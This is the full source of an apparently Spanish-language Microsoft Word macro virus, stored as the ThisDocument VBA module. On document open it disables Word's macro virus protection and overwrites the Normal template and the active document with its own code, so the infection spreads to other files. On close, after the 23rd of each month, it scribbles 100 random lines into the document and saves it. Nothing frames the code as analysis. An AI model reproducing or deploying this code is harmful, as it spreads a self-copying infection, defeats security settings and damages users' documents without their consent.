   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Esta Infectado
   Private Sub Document_Close()
   On Error Resume Next

   Dim i, x1, x2, y1, y2 As Integer
   Dim Figura


   Call Document_Open

   Randomize
   If Day(Now()) > 23 Then

     For i = 1 To 100
       x1 = Int(1000 * Rnd(1000))
       x2 = Int(1000 * Rnd(1000))
       y1 = Int(1000 * Rnd(1000))
       y2 = Int(1000 * Rnd(1000))
       Figura = ActiveDocument.Shapes.AddLine(x1, y1, x2, y2)
     Next i
   End If

   ActiveDocument.Save
   NormalTemplate.Save

   End Sub

   Private Sub Document_Open()
   On Error Resume Next

   Dim ad, nt As Object
   Dim MiCodigo As String
   Dim DocInfectado As Boolean
   Dim NormalInfectado As Boolean

   Options.VirusProtection = False

   'Inicializar Variables
   Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
   Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

   MiCodigo = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
   If Len(MiCodigo) < 1 Then
      MiCodigo = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
   End If

   Dim EsteCogigo As String
       EsteCodigo = Mid(MiCodigo, 1, Len(MiCodigo))

   nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
   nt.CodeModule.AddFromString EsteCodigo

   ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
   ad.CodeModule.AddFromString EsteCodigo

   NormalTemplate.Save
   ActiveDocument.Save
   End Sub
